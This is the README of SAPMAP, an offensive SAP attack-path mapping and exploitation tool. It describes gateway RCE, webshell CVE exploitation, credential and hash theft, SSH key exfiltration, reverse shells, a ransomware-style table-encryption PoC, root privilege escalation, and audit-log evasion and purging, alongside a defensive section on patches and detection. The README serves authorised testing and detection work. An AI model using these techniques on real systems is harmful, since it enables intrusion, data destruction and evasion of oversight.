# SAPMAP — SAP Landscape Attack Path Mapper

```
   _____ ___    ____  __  ______    ____
  / ___//   |  / __ \/  |/  /   |  / __ \
  \__ \/ /| | / /_/ / /|_/ / /| | / /_/ /
 ___/ / ___ |/ ____/ /  / / ___ |/ ____/
/____/_/  |_/_/   /_/  /_/_/  |_/_/
```

**Like BloodHound for Active Directory, but for SAP.**

SAPMAP discovers SAP systems on a network, maps RFC connections between them, exploits gateway vulnerabilities and weak configurations, and charts lateral movement paths across the entire SAP landscape — all from an interactive web-based map.

> ## ⚠️ Disclaimer — Use at your own risk
>
> SAPMAP implements **real, working exploits** against SAP systems.
> Running it against a system you do not own or do not have explicit
> written permission to test is **illegal** in most jurisdictions and
> may cause data loss, account lockouts, outages, and audit findings.
>
> **Intended solely for:** authorized penetration tests, defensive
> research on systems you own, educational study of SAP attack
> surfaces, and SOC / blue-team detection-engineering exercises.
>
> **No warranty** — the authors accept no liability for damage caused
> by use or misuse of this tool. You are responsible for obtaining
> written authorization before every run and for cleaning up artifacts
> (SAPMAP00 users, dropped JSPs, TCP/IP destinations) when done.
>
> See [`DISCLAIMER.md`](DISCLAIMER.md) for the full text.

---

## Table of Contents

- [Features](#features)
- [Detection & Defense](#detection--defense)
- [Architecture](#architecture)
- [Installation](#installation)
- [Usage](#usage)
- [Web GUI](#web-gui)
- [Scanning](#scanning)
- [Default Account Detection](#default-account-detection)
- [Exploitation](#exploitation)
- [RanSAPware Awareness PoC](#ransapware-awareness-poc)
- [MYSAPSSO2 Ticket Forgery](#mysapsso2-ticket-forgery)
- [AutoPwn — Full-Landscape Convergence Loop](#autopwn--full-landscape-convergence-loop)
- [Local Privilege Escalation](#local-privilege-escalation)
- [SSH Lateral Movement](#ssh-lateral-movement)
- [SOAP-RFC over HTTP](#soap-rfc-over-http-firewalled-targets)
- [Propagation](#propagation)
- [SAProuter Support](#saprouter-support)
- [SAP Secure Store Decryption](#sap-secure-store-rsectab-decryption)
- [SAP Cloud Connector (SCC)](#sap-cloud-connector-scc)
- [File Browser](#file-browser)
- [Engagement Reports & Diffs](#engagement-reports--diffs)
- [Evasion & Detection Avoidance (Tier 3)](#evasion--detection-avoidance-tier-3)
- [Standalone Tools](#standalone-tools)
- [Scripted Scenarios](#scripted-scenarios)
- [MCP Server](#mcp-server)
- [State Management](#state-management)
- [Testing](#testing)
- [Configuration](#configuration)

---

## Features

### Discovery & Enumeration
- **Network scanning** — Fast mode (dispatcher/gateway ports) and deep mode (full SAPology fingerprinting)
- **Target parsing** — Single IPs, CIDR subnets, IP ranges, comma-separated lists, files (`@targets.txt`)
- **Client enumeration** — Bruteforce SAP clients 000–999 via DIAG protocol
- **System identification** — Unauthenticated RFC_SYSTEM_INFO probing (3 methods: V6 single-packet, V2 error leak, Chipik-style)
- **SAPControl queries** — Extract SID, database type, system type, and OS via SOAP API (GetInstanceProperties, GetProcessList)
- **Database detection** — Port fingerprinting for HANA, MaxDB, MSSQL, Oracle, DB2

### Default Account Detection
- **SAP default credential scanning** — Tests 16 well-known SAP default username/password combinations via DIAG protocol
- **Sequential testing** — No threading to minimize account lockout risk
- **Smart skip** — Stops testing locked users and non-dialog users automatically
- **Automatic credential import** — Confirmed credentials are added to the system for further exploitation

### Exploitation
- **Gateway SAPXPG exploit** — Unauthenticated OS command execution via the 10KBLAZE technique (P1→P2→P3→P4 protocol chain)
- **dpmon virtual SAP\* user creation (kernel ≥ 790, ABAP)** — Chains GW SAPXPG → `dpmon` → SAP\* one-time password → BAPI_USER_CREATE1 with SAP_ALL.  DB-agnostic alternative to the SQL-INSERT writer chain: single dpmon invocation vs ~40 SAPXPG chunks, kernel-blessed (SAP Note 3303172, won't be patched out), bypasses SCC4 client lock / DBCO routing edge cases.  Available on Phase 2 of AutoPwn and via the right-click context menu
- **CVE-2025-31324 (VisualComposer metadatauploader)** — Unauth Java JSP webshell deployment with chunked-base64 file write, OS-aware command wrapping (cmd.exe / /bin/sh), session-resilient shell tracking
- **Message Server betrusted (CVE-2020-6207 / 10KBLAZE)** — Register a fake dispatcher with the MS so the attacker IP is added to the SAP Gateway's trusted-host list, enabling unauthenticated OS command execution via SAPXPG
- **Direct database injection** — Create SAP users by injecting into USR02/UST04/USRBF2 tables via SQL CLI tools (hdbsql, sqlcli, sqlcmd, sqlplus, db2)
- **BAPI user creation** — Authenticated user creation with SAP_ALL via BAPI_USER_CREATE1
- **SXPG remote execution** — Create users on remote systems via TCP/IP RFC destinations and SXPG_STEP_XPG_START
- **Java post-RECON deploy paths** — CTC ConfigServlet and Telnet console deploy of JSPs once a Java UME admin has been created (handles hardened PI/MDM systems where /irj/ is blocked)
- **Post-creation verification** — Confirm user exists and has SAP_ALL via RFC logon + BAPI_USER_GET_DETAIL
- **MYSAPSSO2 ticket forgery** — Extract `SAPSYS.pse` + `cred_v2` from a compromised ABAP host, derive the signing key, and forge a MYSAPSSO2 logon ticket impersonating any user (e.g. SAP\*).  Multi-instance SECUDIR probing discovers central-instance layouts (D/DVEBMGS/ASCS/SCS + all known instance numbers).  Chunked binary read adapter with `python3` → `python` fallback for older systems.  Generates `.sap` GUI shortcut, `curl.sh`, and `pyrfc.json` delivery artifacts with correct instance number derived from the SECUDIR path

### RanSAPware Awareness PoC
- **Table data encryption** — Encrypt character fields in any SAP table via `RFC_ABAP_INSTALL_AND_RUN`, rendering business-critical data unreadable in seconds
- **Modular rotation cipher** — Per-byte rotation within printable ASCII (0x20–0x7E, 95 chars); length-preserving, stays in printable range, reversible with the manifest key
- **Manifest-based tracking** — Every encryption run produces a JSON manifest (table, fields, key, row count, timestamp) saved to `loot/<SID>/`; decryption requires the exact manifest
- **Double-operation prevention** — Backend + frontend guards prevent encrypting an already-encrypted table or decrypting an already-decrypted one
- **TH_POPUP ransom note** — Optional broadcast popup to all logged-in users via `TH_POPUP` after encryption
- **Suggested tables** — Pre-configured list of high-impact tables (PA0002, KNA1, LFA1, VBAK, EKKO, BKPF, MARA, MAKT, AUFK) with category labels and business descriptions
- **Field metadata discovery** — Automatic detection of encryptable character fields via `DDIF_FIELDINFO_GET`, filtering out structures, table types, and reference types
- **Business impact preview** — Sample data preview before encryption showing what will be affected
- **Recovery workflow** — Decrypt from manifest, undo erroneous decrypts via reverse-encrypt, delete stale manifests from the UI

### Local Privilege Escalation
- **Extensible LPE framework** — Plugin-style `@lpe_method` decorator: add new methods by writing one function
- **BAPI profile assignment** — Direct RFC call to assign SAP_ALL via BAPI_USER_PROFILES_ASSIGN (requires S_RFC)
- **dpmon virtual SAP\* (kernel ≥ 790, ABAP)** — Activate the kernel-blessed virtual super-user SAP\* (SAP Note 3303172) via the dispatcher-monitor tool, capture the one-time password from dpmon's stdout, open a single-shot RFC connection as SAP\*/<OTP>/<client>, BAPI-assign SAP_ALL + SAP_NEW to the original user.  Bypasses S_RFC and the DB-dialect SQL writer chain entirely.  Audit-logged as Security Audit Log event EUP, purpose 2 — operator-visible so the SOC isn't surprised
- **WebGUI RSBDCOS0 exploit** — Reverse-engineered WebGUI HTTP protocol to execute OS commands via RSBDCOS0, running SQL INSERTs to assign SAP_ALL directly in the database — bypasses S_RFC authorization entirely
- **CVE-2026-31431 "Copy Fail" (root LPE on Linux)** — One-shot root OS command execution via AF_ALG authencesn page-cache patching of `/usr/bin/su` with a minimal ELF.  Validated live against SUSE Linux 6.4.0 (s4hadm → uid=0) through SAPXPG.  Non-persistent (reverts on reboot or page-cache eviction).  Pre-flight check confirms vulnerable kernel + AF_ALG primitive before the destructive step

### Lateral Movement
- **RFC connection mapping** — Retrieve all Type 3, Type-G HTTP-to-external, and Type-H HTTP-to-ABAP RFC destinations from compromised systems (SM59 + RFCDES + SecStore-recovered passwords)
- **Destination testing** — Validate logon, ping, and latency via /SDF/RFC_CHECK with automatic fallback to DEST_CHECK_CONNECTION on older systems
- **Automated propagation** — Iteratively exploit RFC connections to move across the landscape
- **Attack path visualization** — Color-coded connections showing SAP_ALL access, gateway exploit paths, and risk levels
- **HTTP-only transport** — Every authenticated RFC primitive (user create / delete / profile read, table read, system info, OS command, ABAP install-and-run, destination ping) also runs over SOAP-RFC against ABAP systems whose dispatcher / gateway ports (32NN / 33NN) are firewalled but whose ICM HTTP port is reachable.  See [SOAP-RFC over HTTP](#soap-rfc-over-http-firewalled-targets)
- **SSH key harvest** — Exfiltrate SSH private keys from compromised SAP hosts (`~sidadm/.ssh/`).  Content-based detection reads the first 64 bytes of each file for `PRIVATE KEY` headers, catching non-standard key names (e.g. `my_id`).  Filters root-owned keys when running as sidadm, skips bare hostnames without dots from `known_hosts`
- **SSH key harvest as root** — Harvest keys from all `/home/*/.ssh/` directories using the Linux LPE root channel (Copy Fail / Dirty Frag)
- **SSH lateral movement** — Test harvested keys against `known_hosts` targets.  On success, marks the target node as pwned (red border + lightning bolt) and stores `ssh_access` metadata for persistent SSH-based command execution
- **SSH OS Console** — Execute arbitrary OS commands on SSH-pwned targets through the source node's SAPXPG channel.  Commands are base64-encoded and piped through `echo B64|base64 -d|sh` on the remote
- **SSH reverse/bind shell** — Deliver reverse or bind shell payloads to SSH-pwned targets.  Multi-interpreter wrapper auto-detects `python3` → `python` → `perl` → `bash /dev/tcp` on the remote.  Payload is chunked to fit SAPXPG's 255-byte PARAMS limit using double-b64 encoding through the `echo|base64|sh` pipeline

### ⚡ AutoPwn — Full-Landscape Convergence Loop
One-click automation that chains scanning → exploitation → enrichment → propagation across the entire landscape until no new systems can be reached.  Replaces the manual right-click-per-system workflow with a self-driving wave loop that picks the right exploit for each node's stack type (ABAP vs Java vs HANA), harvests credentials from Java Secure Stores and ABAP RSECTAB, and feeds those credentials back into the next wave for lateral movement.

- **Convergence loop** — Repeats `SCAN → EXPLOIT → ENRICH → PROPAGATE` until a wave produces zero new pwned nodes (configurable max 3 / 5 / 10 / 20 waves)
- **Stack-aware exploit priorities** — ABAP nodes try GW SAPXPG first (instant SQL INSERT); Java nodes try CVE-2025-31324 → RECON → GW-Java (UME JSP via SAPXPG); HANA-only nodes skip GW entirely (no ABAP stack behind the gateway)
- **Java SecStore propagation** — When a Java node is pwned, AutoPwn extracts the Secure Store via the deployed JSP webshell, imports `SAPJSF_<sid>_<client>` credentials for downstream ABAP systems, auto-plots them on the map, and uses those creds to create `SAPMAP00` directly via BAPI_USER_CREATE1 — no ABAP access needed on the Java source
- **Salvage on partial failure** — If `create_user_java` fails (e.g. UME password policy rejects the password) but the CVE-2025-31324 JSP shell is live, AutoPwn still harvests the Secure Store and Java destinations through the shell
- **Connection coloring** — Every connection successfully used for lateral movement gets `logon_successful + has_sap_all` set, turning the map edge red (same visual as the GUI "Test RFCs" flow)
- **Live progress panel** — Docked right-side panel (non-blocking) shows current phase, per-wave stats, per-node detail lines, and full streaming console.  Press **STOP** any time — stop checks fire inside scanner port loops, not just between phases, so it aborts within one timeout window
- **Post-run detection pass** — Reports CVE-2022-22536 (ICMAD) and SAProuter Info Leak as findings without attempting exploitation (kept separate from the convergence loop because they're noisy / non-credential-yielding)
- **Optional phases** — Toggle LPE (privilege escalation to root on each pwned node) and BTP (cloud lateral movement) on/off in the launch modal

### SAP BTP (Cloud) Integration
Both directions of the on-prem ↔ cloud trust boundary are mapped automatically:

**Cloud → on-prem.** Paste a BTP access token (`cf oauth-token`, a destination-service service-key token, or a btp-cli / cockpit token) via *File → Actions → BTP OAuth Token*.  SAPMAP detects the token kind (`cf`, `destination`, `subaccount`) from `aud`/`cid`/`scope` claims and routes enumeration to the APIs that token can actually reach — no 401 noise spraying APIs that aren't in scope.  For destination-service tokens it pulls every destination on the bound subaccount, captures cleartext where `destination_configuration.ApiAccess` is granted, and links each cleartext credential to a matching on-prem `SAPNode`.  Unknown back-end hosts are auto-materialised as `BTPDISC_*` placeholder nodes with a dashed amber border so the operator can see "BTP knows about this back-end, you haven't scanned it yet"; *Standard Scan* fires automatically to fingerprint them and promote to a real node.

**On-prem → cloud (reverse pivot).** *Right-click any pwned ABAP node → Exploitation → Harvest BTP Credentials* mines four sources for BTP-shaped `(client_id, client_secret, uaa_url)` tuples in one click:
  1. SM59 outbound destinations to `*.hana.ondemand.com` (Type-G with SecStore-recovered passwords).
  2. Transaction `OA2C_CONFIG` profiles (`OA2C_CLIENT` + `OA2C_CLIENT_EXT` joined on `CLIENT_UUID`, matched to `/OA2C/CS_<UUID>_NN` secstore secrets).
  3. ABAP RSECTAB rows mentioning a BTP host.
  4. Java SecStoreFS rows for SAP CPI / Cloud Integration.

The OA2C reader uses a three-tier resilience chain: `DDIF_FIELDINFO_GET` for column discovery (independent of `RFC_READ_TABLE`'s 512-byte WA limit), `RFC_READ_TABLE` with `USE_ET_DATA_4_RETURN='X'` for STRING-typed columns, then `RFC_ABAP_INSTALL_AND_RUN` as the final fallback when the kernel still drops STRING values.  Click *Mint* on a candidate and SAPMAP exchanges at XSUAA's `/oauth/token` with `grant_type=client_credentials`, stores the token, and auto-fires the cloud-side enumeration so the cloud topology populates the map without a second click.

**On-prem → cloud via RFC 8705 mTLS (no client_secret).**  When the on-prem side has an SM59 Type-G destination configured for X.509 client cert auth (Q=A + SSL Client PSE), the same lateral move works without a shared secret.  *Right-click the BTP cloud node → Mint Token via Cert-Auth (RFC 8705)*: SAPMAP asks the SAP kernel to `cl_http_client=>create_by_destination(...)` and POST `grant_type=client_credentials&client_id=<binding-id>` at XSUAA's `.cert.` token endpoint.  The kernel presents the PSE's cert on the mTLS handshake, XSUAA validates the [RFC 8705](https://datatracker.ietf.org/doc/html/rfc8705) `x5t#S256` binding, and issues a certificate-bound JWT — which is then handed to the same auto-enumerate path as the harvested-secret mint.  The token is bound to the cert, so even if the JWT leaks it can't be re-used without the private key.  Setup requires an x509 service key on the BTP side (`cf create-service-key <inst> <key> -c '{"credential-type":"X509_PROVIDED","certificate":"<PEM>"}'` reusing an existing PSE cert, or `X509_GENERATED` if letting BTP mint one for a fresh PSE) and an SM59 destination pointed at `<subdomain>.authentication.cert.<region>.hana.ondemand.com/oauth/token`.  Reach for this path when the on-prem side has cert-auth infrastructure but the OA2C / RSECTAB harvest turns up empty — cert-auth destinations don't leave a client_secret in the secstore for the harvester to find.

**SCC ↔ BTP edges.** Sky-blue dashed lines link every Cloud Connector to every BTP subaccount it tunnels into (sourced from `SCCNode.subaccount_uuids` plus `BTPSubaccountNode.scc_locations`).  Synthetic BTP→on-prem RFC edges (`source_sid="BTP:<uuid8>"`) are first-class members of the trust-chain analyser, so a cloud token leaking an on-prem credential shows up as a CRITICAL chain finding alongside any classic ABAP→ABAP edge.

### Interactive Map
- **SVG-based visualization** — Drag-and-drop system nodes with persistent positions
- **Real-time console** — Live streaming output of all operations
- **Context menus** — Right-click systems or the map background for quick actions
- **Connection details** — Hover over RFC links to see destination info, profiles, roles, risk assessment
- **State persistence** — Save/load `.sapmap` session files, auto-save on exit

### SAP Secure Store Decryption (RSECTAB)
- **Full RSECTAB decryption** — Extract RFC destination passwords, DB connection credentials, CTS transport passwords, SMTP credentials, and HMAC keys
- **Individual key support** — Reads SSFS KEY + DAT files from the OS filesystem, decrypts with SAP's RSECCipher (custom DES with proprietary S-boxes), extracts the RSECTAB individual encryption key
- **Default key support** — Systems using the well-known default key are decrypted automatically
- **VERSION 2 + VERSION 3** — Handles both legacy (two-stage 3DES with keyprime) and modern (single-stage, `RSEC` magic) formats
- **Multiple fallback paths** — ABAP exec → SXPG file read (base64/certutil) → SXPG database query (hdbsql/sqlcli/sqlcmd/sqlplus) → RFC_READ_TABLE → client fallback
- **Client fallback** — When ABAP exec is blocked by SCC4, auto-discovers open clients via T000 CCCORACTIV, creates SAPMAP00 there, and retries
- **Map integration** — Decrypted passwords enriched onto RFC connections (click to reveal), categorised entries shown in node detail panel, credentials added to target nodes for lateral movement
- **SecStore-based lateral movement** — When BAPI via DESTINATION fails (locked source), extracts RFC destination password from SecStore and connects directly to target

### SAProuter Support
- **Transparent routing** — All operations (RFC, port scanning, GW exploit, system probing) work through SAP Router proxy
- **NI_ROUTE protocol** — Pure Python implementation of SAProuter tunnel establishment (NI_ROUTE → NI_PONG)
- **Per-system configuration** — Set SAProuter string per system via right-click menu or manual add dialog
- **Automatic inheritance** — Target systems discovered via RFC connections inherit the source's SAProuter
- **RFC SDK integration** — NW RFC SDK's native `saprouter` parameter used for authenticated connections

### Data Extraction
- **Password hash download (5-method fallback chain)** — (1) SXPG database CLI for full BCODE/PASSCODE/PWDSALTEDHASH via `sqlplus` / `hdbsql` / `sqlcmd` — (2) wide RFC_READ_TABLE on USR02 with all fields — (3) RAW-less retry (PWDSALTEDHASH only — the modern iSSHA-1 hash, hashcat mode 10300) — (4) **legacy USR02** (BCODE + PASSCODE without PWDSALTEDHASH for pre-6.40 SAP_BASIS Oracle landscapes) — (5) bare user inventory.  Existing TCP/IP destination reuse to sidestep the FL046 / S_RFC_ADM dest-creation restriction
- **Java password hashes** — Dump UME_STRINGS j_user / j_password pairs via dropped JSP for offline cracking
- **ABAP SecStore (RSECTAB) decryption** — Full decryption chain (see below) writes loot/secstore/secstore_<SID>_<ts>.json
- **Java SecStore (SecStoreFS) decryption** — Server-side decryption via dropped JSP, classifies entries (sapjsf / jdbc_local / jco_dest / configentry), auto-plots downstream ABAP credentials onto the map.  Loot saved to loot/secstore/java_secstore_<SID>_<ts>.json
- **Arbitrary table reads** — Download any SAP or Java DB table via RFC_READ_TABLE / dropped JSP JDBC.  Saved to loot/tables/
- **Business Impact Assessment (BIA)** — Scenario-based queries against compromised systems (customer data breach, payroll, supply chain, etc.) — exports per-scenario CSV to loot/bia/
- **Client role detection** — Identify production (P), QA (Q), test (T) systems from T000 with CCCORACTIV
- **hashes.com integration** — Submit recovered hashes (ABAP BCODE/PASSCODE/PWDSALTEDHASH and SCC SHA-1/SHA-256/PBKDF2) directly to hashes.com rainbow-table API; cracked plaintext is auto-stored as a credential and the node is marked pwned. Auto-lookup toggle (default ON) fires immediately after every hash extract; results fan out across users that share a hash so one cracked password lights up every account using it

### File Browser
- **Interactive file browser** — Browse, upload, and download files on compromised SAP targets through any available OS-exec channel (GW SAPXPG, SXPG-authenticated, CTCWebService, SAPControl, CVE-2025-31324 JSP webshell).  Address bar navigation, clickable column sorting, Windows drive enumeration
- **Cross-OS** — Linux (python3 chunked b64 + /usr/bin/base64) and Windows (certutil -encode/-decode + cmd.exe echo) with automatic OS detection
- **Integrity verification** — Every upload computes local MD5, transfers via chunked base64, computes remote MD5, and hard-fails on mismatch.  Downloads verify reassembled size against pre-flight stat
- **SAPXPG-resilient** — Multi-fallback chain for stdout-dropping exec channels: dir /-C /A → dir /B /A (bare names + batched stat) → file redirect (dir > tmpfile + type) for directory listings; single-shot base64 → python3 chunked read for downloads
- **ATT&CK mapped** — T1083 File and Directory Discovery, T1005 Data from Local System, T1105 Ingress Tool Transfer

### Engagement Reports & Diffs
- **Self-contained HTML engagement report** — File → Export Engagement Report writes both Markdown and HTML versions to `loot/reports/`. The HTML is presentable: gradient hero with colour-coded overall-risk pill, 9 KPI cards with delta colouring, severity-coloured finding cards, ranked attack-path table, **inline SVG snapshot of the discovered landscape** (auto-grid layout, ⚡ pwned overlay, red production halo), folded SCC + SAP inventory, masked credentials table, and **structural recommendations derived from state** (gateway ACL, MS ACL, SAProuter ACL, default-cred rotation, SecStore rotation, SCC default creds, IR for pwned PRD, untested-RFC-to-PRD review, etc., each with SAP Note refs)
- **Diff between two .sapmap snapshots** — File → Diff Two Runs picks any two saved states (or one against the live in-memory state) and writes a self-contained HTML diff to `loot/reports/`. Hero strip is colour-banded ("MAJOR REGRESSION" / "New exposure" / "Remediation progress" / "No major change"), 9 signed-delta KPI cards, sections for new vs. remediated findings, new vs. disappeared trust chains, added/removed/changed nodes with before-after tables, and SCC + RFC connection deltas
- **Trust-chain analysis** — BFS from every entry-point system across the RFC adjacency graph, ranks paths by severity (CRITICAL/HIGH/MEDIUM/LOW based on production endpoints + SAP_ALL throughout); includes **untested RFC edges** with an explicit `UNTESTED` flag (only proven-broken edges are dropped, so chains landing on PRD aren't silently hidden)

### Evasion & Detection Avoidance (Tier 3)
- **SAL slot disable** — Temporarily disable Security Audit Log recording slots via shared-memory-only writes (RSAU_UPD_AUDIT_CONFIG), then auto-restore after a configurable hold window.  No disk persistence, no SM19 "Last changed by" header update — stealth path confirmed on kernel 793
- **Kernel parameter dynamic-set** — Flip SAP profile parameters at runtime via TH_SET_PARAM (shared memory only); auto-restores original values on exit
- **RSAU API surface probe** — Discovery-only read of every RSAU_API_* function module's signature (IMPORT/EXPORT/TABLES) — reveals the exact interface the writer needs without touching any config
- **Dynamic SAL profile dump** — Read the active dynamic filter profile (RSAU_API_GET_PROFILE with ID_DYN_CONF='X') to inspect live slot/filter state before any mutation
- **SAL UNAME narrow** — Swap the user filter on active SAL recording slots to exclude the SAPMAP00 user (e.g. `*` → `A*`), then auto-restore after a configurable hold window.  Uses the legacy RSAU_UPD_AUDIT_CONFIG shared-memory writer — no disk persistence
- **Java SAL suppress** — Deploy a LogController JSP onto AS Java that calls `Category.setEffectiveSeverity(Severity.NONE)` on the 6 Security Audit Log categories.  Runtime-only (JVM heap), no NWA change-log entry, auto-restored on JVM restart.  Full baseline → suppress → hold → restore cycle with HTTP-based baseline management
- **DBTABLOG post-hoc purge** — Capture `sy-datum + sy-uzeit` baseline, wait for a hold window (operator runs actions whose table-change log entries should be erased), then `DELETE FROM DBTABLOG WHERE LOGDATE/LOGTIME > baseline` with optional `TABNAME` whitelist.  DBTABLOG is delivery class `L` (not itself logged) so the DELETE does not recurse.  No DD09L touch, no DDIC reactivation, no transport object.  Primary channel: GW SAPXPG → `hdbsql` (HANA-only, bypasses ABAP DBI).  Fallback: `RFC_ABAP_INSTALL_AND_RUN` throwaway DELETE program (any DB)
- **Evasion baseline snapshot** — Pre-flight capture of all mutable state (kernel params + SAL slot config + filter rows) into a JSON file; every Tier 3 mutation auto-restores from this baseline on exit
- **Arm gate** — All Tier 3 entry points refuse to run unless `--allow-evasion` was passed at startup and (for mutation writers) a baseline has been captured.  Visual "⚡ Tier 3 Armed" bar in the GUI confirms the session state

### Cleanup
- **User deletion** — Remove all created SAPMAP users via BAPI_USER_DELETE
- **Destination removal** — Clean up created TCP/IP RFC destinations

---

## Detection & Defense

> **For blue teams.** SAPMAP's Tier 3 evasion is designed to be silent on the SAP side, so detection lives mostly outside SAP (network + OS) and inside SAP relies on signals the tool doesn't suppress. Patch first; detect second.

### Patch — SAP Notes that close SAPMAP's main exploit primitives

| Capability | SAP Note(s) | What it closes |
|---|---|---|
| 10KBlaze Gateway SAPXPG OS exec | **1408081** (also 1421005, 821875) | Unauth gateway-registered server abuse (`gw/sec_info`, `gw/reg_info`) |
| Message Server betrusted (CVE-2020-6207) | **2890213** | Unauth internal MS port abuse / ACL bypass |
| VisualComposer JSP webshell (CVE-2025-31324) | **3594142** | Unauth file upload via `/developmentserver/metadatauploader` |
| RECON Java LM Wizard (CVE-2020-6287) | **2934135** (FAQ 2948106) | Unauth Java admin user creation via `/CTCWebService/CTCWebServiceBean` |
| SAProuter info leak (CVE-2022-22536) | **3123396** | Unauth landscape discovery via SAProuter response |
| ICMAD (CVE-2022-22536) | **3123396** | ICM HTTP smuggling / response splitting |

Beyond the named CVEs, the highest-leverage configuration changes:

- **`secinfo` and `reginfo` deny-by-default** on the Gateway. The 10KBlaze path dies if `gw/sec_info` and `gw/reg_info` are properly populated. Empty or `P TP=* USER=* HOST=* USER-HOST=*` is fatal.
- **`gw/sim_mode = 0`** (not 1). Simulation mode logs but allows — the same path SAPMAP exploits.
- **`ms/acl_info` populated and enforced**. SAPMAP's MS betrusted path needs an open internal port (`39NN`).
- **Restrict `RFC_ABAP_INSTALL_AND_RUN`** via auth check (`S_DEVELOP RFC_ABAP_INSTALL_AND_RUN`) for non-developer service users. SAPMAP uses it for OA2C reading, RSECTAB decryption, DBTABLOG purge, and several LPE paths.
- **Avoid `SAP_ALL` on RFC destinations.** RFC destinations stored with hardcoded credentials granting `SAP_ALL` are the single most common pivot SAPMAP exploits during lateral movement. Use a least-privilege technical user per destination with only the profiles required for the documented interface — not a blanket `SAP_ALL`.
- **Change every default credential** before the system touches a non-isolated network. SAPMAP tries 16 of them via DIAG with sub-second latency.
- **Disable VisualComposer** if you don't use it. The CVE-2025-31324 endpoint is SAPMAP's primary JSP-deploy channel.

### Detect — signals SAPMAP can't (or doesn't) suppress

**Network-level** (out-of-band, invisible to SAP-side evasion):

- High-volume short connections to SAP ports (`32NN`, `33NN`, `36NN`, `50NNN`, `30NNN`, `39NN`) from a single source within seconds — SAPMAP's `--fast` mode probes a whole landscape in under a minute.
- NI-protocol packets to port `33NN` from non-app-server IPs — 10KBlaze SAPXPG.
- HTTP POST to `/developmentserver/metadatauploader` (CVE-2025-31324) or `/CTCWebService/CTCWebServiceBean` (RECON).
- User-agent `SAPMAP/1.0` in ICM HTTP logs (most modules), or default Python `urllib` UAs.
- Repeated SAProuter `NI_ROUTE` requests to internal hosts from a single source.

**OS-level** (survives SAP-side audit suppression):

- New JSPs in IRJ webapp root: `/usr/sap/<SID>/J<NN>/j2ee/cluster/apps/sap.com/irj/servlet_jsp/irj/root/<random>.jsp` owned by `<sid>adm` with recent `ctime`. SAPMAP names them `db<6chars>.jsp`, `lc<6chars>.jsp`, `pse<6chars>.jsp`, etc. Inotify-watch this directory.
- Unexpected `<sid>adm` child processes of `gwrd`, `disp+work`, or `ms.sap*`.
- `/tmp/sapmap_*` files — staged SQL written by GW SAPXPG → hdbsql.
- `auditd` rule for `ptrace_attach` (`-a always,exit -F arch=b64 -S ptrace`) — catches kernel-binary tampering invisible to SAP.
- File integrity monitoring on `/usr/sap/<SID>/SYS/global/security/` (SecStore extraction reads SAPSYS.pse, cred_v2, SSFS_*.DAT).

**SAP-level** (USR02 / SM20 / DBTABLOG / SM59):

- New `USR02` entries immediately followed by a successful logon as the new user. Names like `SAPMAP00` are placeholders; alert on *any* fresh USR02 INSERT that succeeds a login within minutes.
- `USR04` with `PROFILE = 'SAP_ALL'` or `'SAP_NEW'` added to non-admin users.
- New SM59 destinations (TCP/IP or HTTP) pointing to unusual targets — SAPMAP creates `SAPMAP_BACK_*` during lateral movement.
- DBTABLOG entries for `USR02`, `USR04`, `USRBF2`, `UST04`, `RFCDES`, `RFCTRUST`, `USREFUS`. SAPMAP's DBTABLOG purge only deletes entries written *during* its hold window — events before evasion is armed remain.
- `RFC_ABAP_INSTALL_AND_RUN` calls with program names matching `ZSAPMAP_*` / `ZSAP_OA2C` / `ZSAPMAP_DBPURGE`.
- ST22 short dumps referencing `SDIFRUNTIME` with `ZSAPMAP_*` programs.
- Authorization Trace on `S_USER_PRO ACTVT=06` — catches `bapi_profiles_assign` LPE.
- SAL events `EU2` / `EU3` / `DU9` on system tables — catches RFC_READ_TABLE on `RSECTAB`, `RFCDES`, `OA2C_*`.

### Spotting Tier 3 evasion — gaps in each technique

SAPMAP's Tier 3 techniques are designed to leave no SAP-side trace. Each one still leaks somewhere:

- **SAL slot disable / UNAME narrow** — `RSAU_UPD_AUDIT_CONFIG` shared-memory write, no `SM19` "Last changed by" header update. **Gap**: poll `RSAU_API_GET_CONFIG` via RFC every 5 min and alert on any slot whose `STATUS`/`UNAME` differs from the persisted profile in `RSAUPROF`. Push SAL to SIEM via `RSAU_API_GET_LOG_DATA` so on-disk gaps don't matter.
- **Dynamic kernel parameter flip** (`gw/logging`, `rdisp/TRACE`) — `TH_CHANGE_PARAMETER`. **Gap**: `RSPFL_HISTORY_DISPLAY` records every dynamic change. Alert on any change to `gw/logging`, `rdisp/TRACE`, `rec/client`, `rsau/*`.
- **Java SAL severity flip** — `Category.setEffectiveSeverity(Severity.NONE)`. **Gap**: NWA Log Configuration shows **"Severity Origin: Runtime Override"** for any category whose runtime severity differs from the persisted value. Export Log Config periodically and diff. The CCDB push (if enabled) carries the same field.
- **DBTABLOG post-hoc purge** — DELETEs DBTABLOG rows from the hold window. DBTABLOG is delivery class `L`, so the DELETE leaves no DBTABLOG row about itself. **Gaps**:
  - HANA SQL audit on `DBTABLOG` with action `DELETE`: `ALTER AUDIT POLICY ... AUDIT ACTION ON DBTABLOG (DELETE) SUCCESS`.
  - LOGID gap analysis — DBTABLOG LOGID is sequential per work-process; unexplained gaps on a single hostname/instance combination indicate a DELETE.
  - GW SAPXPG → `hdbsql` path: OS-level shell history under `<sid>adm` and `/tmp/sapmap_gw.sql` remain unless the operator cleans them up.

### Centralized SIEM should ingest

1. **SAL push** via `rsau/local/alerter` or `RSAU_API_GET_LOG_DATA` polling — so on-disk audit-file mutation doesn't help an attacker.
2. **OS file integrity** on `/usr/sap/<SID>/J<NN>/j2ee/cluster/apps/sap.com/irj/servlet_jsp/irj/root/` and `/usr/sap/<SID>/SYS/global/security/`.
3. **DDIC / USR02 / USR04 change events** via CDHDR/CDPOS or DBTABLOG.
4. **Web Dispatcher / ICM access logs** for the unauth endpoints listed above.
5. **`RSPFL_HISTORY_DISPLAY` daily snapshot** — diff for parameter flips.
6. **NWA Java Log Configuration export** — diff for `Runtime Override` entries.

---

## Architecture

The codebase is organised under `modules/` by concern.  `sapmap.py` at the project root is the entry point; every other Python file lives in a topical subpackage.

```
sapmap.py                              Entry point — CLI args, server launch, state management
modules/
├── core/
│   ├── sapmap_models.py               Data models — SAPNode, RFCConnection, CreatedUser, SAPMAPState
│   ├── sapmap_state.py                State persistence — save/load JSON, RFC cache, loot dir helpers
│   ├── sapmap_config.py               Configuration — SQL templates, password hashes, defaults
│   ├── sapmap_findings.py             Critical-finding bus (independent of GUI)
│   ├── sapmap_errors.py               format_rfc_exception() — pyrfc detail extractor
│   ├── sapmap_stop.py                 Process-wide stop signal for background ops
